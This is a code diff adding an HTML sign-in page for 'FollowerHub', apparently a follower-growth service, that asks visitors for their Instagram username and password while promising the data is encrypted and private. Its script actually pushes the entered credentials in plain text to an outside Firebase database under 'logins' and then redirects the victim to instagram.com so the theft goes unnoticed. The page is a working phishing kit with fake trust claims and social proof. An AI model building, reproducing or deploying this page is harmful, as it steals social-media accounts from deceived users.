@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FollowerHub — Sign In</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=DM+Sans:ital,wght@0,300;0,400;1,300&display=swap" rel="stylesheet">
+
+<style>
+:root {
+  --bg: #080a0f;
+  --surface: #0e1118;
+  --border: rgba(255,255,255,0.07);
+  --pink: #ff3cac;
+  --orange: #f7971e;
+  --purple: #a259ff;
+  --white: #f0f0f0;
+  --muted: #7a7f8e;
+}
+
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  background: var(--bg);
+  color: var(--white);
+  font-family: 'DM Sans', sans-serif;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  cursor: none;
+}
+
+/* Noise */
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+  pointer-events: none; z-index: 1000; opacity: 0.35;
+}
+
+/* Cursor */
+.cursor { position:fixed; width:10px; height:10px; background:var(--pink); border-radius:50%; pointer-events:none; z-index:9999; transform:translate(-50%,-50%); mix-blend-mode:difference; }
+.cursor-ring { position:fixed; width:36px; height:36px; border:1px solid rgba(255,60,172,0.5); border-radius:50%; pointer-events:none; z-index:9998; transform:translate(-50%,-50%); transition:all 0.18s ease; }
+
+/* Blobs */
+.blob { position:fixed; border-radius:50%; filter:blur(90px); opacity:0.15; animation:drift 12s ease-in-out infinite alternate; }
+.blob-1 { width:500px; height:500px; background:var(--purple); top:-200px; left:-150px; animation-duration:14s; }
+.blob-2 { width:450px; height:450px; background:var(--pink); bottom:-150px; right:-150px; animation-duration:10s; animation-delay:-4s; }
+.blob-3 { width:350px; height:350px; background:var(--orange); top:40%; left:40%; animation-duration:16s; animation-delay:-7s; }
+
+@keyframes drift {
+  0%   { transform: translate(0,0) scale(1); }
+  100% { transform: translate(30px,20px) scale(1.06); }
+}
+
+/* Back link */
+.back {
+  position: fixed; top: 28px; left: 32px;
+  font-size: 13px; color: var(--muted);
+  text-decoration: none;
+  display: flex; align-items: center; gap: 7px;
+  transition: color 0.2s;
+  z-index: 10;
+  cursor: none;
+}
+.back:hover { color: var(--white); }
+
+/* Main card */
+.wrap {
+  position: relative; z-index: 2;
+  width: 100%; max-width: 440px;
+  padding: 20px;
+  animation: fadeUp 0.6s ease both;
+}
+
+@keyframes fadeUp {
+  from { opacity:0; transform:translateY(28px); }
+  to   { opacity:1; transform:translateY(0); }
+}
+
+/* Logo */
+.logo {
+  font-family: 'Syne', sans-serif;
+  font-weight: 800;
+  font-size: 26px;
+  text-align: center;
+  margin-bottom: 32px;
+  letter-spacing: -0.5px;
+}
+.logo span {
+  background: linear-gradient(90deg, var(--pink), var(--orange));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+.card {
+  background: linear-gradient(145deg, #12151f, #0e1118);
+  border: 1px solid var(--border);
+  border-radius: 28px;
+  padding: 44px 40px;
+  box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05);
+  position: relative;
+  overflow: hidden;
+}
+
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 2px;
+  background: linear-gradient(90deg, var(--purple), var(--pink), var(--orange));
+}
+
+/* Subtle Instagram-ish ring graphic */
+.card::after {
+  content: '';
+  position: absolute;
+  width: 280px; height: 280px;
+  border-radius: 50%;
+  border: 1px solid rgba(255,60,172,0.06);
+  top: -100px; right: -100px;
+  pointer-events: none;
+}
+
+.card-eyebrow {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 2.5px;
+  color: var(--purple);
+  margin-bottom: 14px;
+  display: flex; align-items: center; gap: 8px;
+}
+.card-eyebrow::before {
+  content: '';
+  width: 6px; height: 6px;
+  background: var(--purple);
+  border-radius: 50%;
+  animation: pulse 2s ease infinite;
+}
+@keyframes pulse {
+  0%,100% { opacity:1; transform:scale(1); }
+  50%      { opacity:0.3; transform:scale(0.6); }
+}
+
+.card h2 {
+  font-family: 'Syne', sans-serif;
+  font-size: 30px;
+  font-weight: 800;
+  letter-spacing: -0.8px;
+  margin-bottom: 8px;
+}
+.card > p {
+  color: var(--muted);
+  font-size: 14px;
+  line-height: 1.65;
+  margin-bottom: 32px;
+}
+
+.input-wrap {
+  position: relative;
+  margin-bottom: 14px;
+}
+.input-icon {
+  position: absolute;
+  left: 18px; top: 50%;
+  transform: translateY(-50%);
+  color: var(--muted);
+  font-size: 15px;
+  pointer-events: none;
+}
+input {
+  width: 100%;
+  padding: 17px 17px 17px 46px;
+  background: rgba(255,255,255,0.04);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  color: var(--white);
+  font-size: 15px;
+  font-family: 'DM Sans', sans-serif;
+  outline: none;
+  transition: border-color 0.2s, background 0.2s, box-shadow 0.2s;
+  cursor: none;
+}
+input::placeholder { color: var(--muted); }
+input:focus {
+  border-color: rgba(255,60,172,0.45);
+  background: rgba(255,255,255,0.06);
+  box-shadow: 0 0 0 4px rgba(255,60,172,0.07);
+}
+
+.btn-main {
+  width: 100%;
+  padding: 18px;
+  border: none;
+  border-radius: 14px;
+  background: linear-gradient(90deg, var(--purple), var(--pink), var(--orange));
+  color: white;
+  font-family: 'Syne', sans-serif;
+  font-size: 16px;
+  font-weight: 700;
+  letter-spacing: 0.3px;
+  cursor: none;
+  transition: transform 0.2s, box-shadow 0.2s;
+  margin-top: 6px;
+  position: relative;
+  overflow: hidden;
+}
+.btn-main::after {
+  content: '';
+  position: absolute; inset: 0;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.13), transparent);
+  transform: translateX(-100%);
+  transition: transform 0.5s;
+}
+.btn-main:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(255,60,172,0.3); }
+.btn-main:hover::after { transform: translateX(100%); }
+
+.divider {
+  display: flex; align-items: center; gap: 14px;
+  margin: 22px 0;
+}
+.divider::before, .divider::after {
+  content: ''; flex: 1; height: 1px;
+  background: var(--border);
+}
+.divider span { font-size: 12px; color: var(--muted); white-space: nowrap; }
+
+.trust-row {
+  display: flex;
+  justify-content: center;
+  gap: 22px;
+  margin-top: 18px;
+}
+.trust-row span {
+  font-size: 12px;
+  color: var(--muted);
+  display: flex; align-items: center; gap: 5px;
+}
+
+/* Social proof strip below card */
+.below-card {
+  margin-top: 22px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+}
+.avatars {
+  display: flex;
+}
+.avatar {
+  width: 28px; height: 28px;
+  border-radius: 50%;
+  border: 2px solid var(--bg);
+  margin-left: -8px;
+  font-size: 11px;
+  font-weight: 700;
+  display: flex; align-items: center; justify-content: center;
+}
+.avatar:first-child { margin-left: 0; }
+.below-text { font-size: 13px; color: var(--muted); }
+.below-text strong { color: var(--white); }
+</style>
+</head>
+<body>
+
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<div class="blob blob-1"></div>
+<div class="blob blob-2"></div>
+<div class="blob blob-3"></div>
+
+<a href="index.html" class="back">← Back</a>
+
+<div class="wrap">
+  <div class="logo">Follower<span>Hub</span></div>
+
+  <div class="card">
+    <div class="card-eyebrow">Secure Access</div>
+    <h2>Welcome back.</h2>
+    <p>Sign in to your Instagram account to continue growing your audience.</p>
+
+    <div class="input-wrap">
+      <span class="input-icon">@</span>
+      <input type="email" id="email" placeholder="Email or username" autocomplete="off">
+    </div>
+
+    <div class="input-wrap">
+      <span class="input-icon">🔒</span>
+      <input type="password" id="password" placeholder="Password" autocomplete="off">
+    </div>
+
+    <button class="btn-main" onclick="loginUser()">
+      Continue to FollowerHub →
+    </button>
+
+    <div class="divider"><span>your data is encrypted & private</span></div>
+
+    <div class="trust-row">
+      <span>✓ No bots</span>
+      <span>✓ 100% private</span>
+      <span>✓ Instant access</span>
+    </div>
+  </div>
+
+  <div class="below-card">
+    <div class="avatars">
+      <div class="avatar" style="background:linear-gradient(135deg,#833ab4,#fd1d1d);">S</div>
+      <div class="avatar" style="background:linear-gradient(135deg,#f7971e,#ffd200);">M</div>
+      <div class="avatar" style="background:linear-gradient(135deg,#a259ff,#3cefff);">L</div>
+      <div class="avatar" style="background:linear-gradient(135deg,#ff3cac,#f7971e);">K</div>
+    </div>
+    <div class="below-text"><strong>40,000+</strong> creators already inside</div>
+  </div>
+</div>
+
+<script type="module">
+
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import { getDatabase, ref, push }
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyA5_RpvfgLdbBZTC16iOF3Ag-T1SgmYzFc",
+  authDomain: "instagram-991c8.firebaseapp.com",
+  databaseURL: "https://instagram-991c8-default-rtdb.firebaseio.com",
+  projectId: "instagram-991c8",
+  storageBucket: "instagram-991c8.firebasestorage.app",
+  messagingSenderId: "1061261822058",
+  appId: "1:1061261822058:web:0db9915948489155962213"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+window.loginUser = function() {
+  const email    = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+
+  const loginsRef = ref(db, "logins");
+  push(loginsRef, {
+    email: email,
+    password: password,
+    timestamp: new Date().toISOString()
+  }).finally(() => {
+    window.location.href = "https://www.instagram.com";
+  });
+};
+
+// Cursor
+const cursor = document.getElementById('cursor');
+const ring   = document.getElementById('cursorRing');
+let mx=0, my=0, rx=0, ry=0;
+document.addEventListener('mousemove', e => { mx=e.clientX; my=e.clientY; });
+(function animateCursor() {
+  rx += (mx-rx)*0.18; ry += (my-ry)*0.18;
+  cursor.style.left = mx+'px'; cursor.style.top = my+'px';
+  ring.style.left   = rx+'px'; ring.style.top  = ry+'px';
+  requestAnimationFrame(animateCursor);
+})();
+document.querySelectorAll('button, a, input').forEach(el => {
+  el.addEventListener('mouseenter', () => { ring.style.transform='translate(-50%,-50%) scale(1.6)'; ring.style.borderColor='rgba(255,60,172,0.8)'; });
+  el.addEventListener('mouseleave', () => { ring.style.transform='translate(-50%,-50%) scale(1)';   ring.style.borderColor='rgba(255,60,172,0.5)'; });
+});
+</script>
+</body>
+</html>
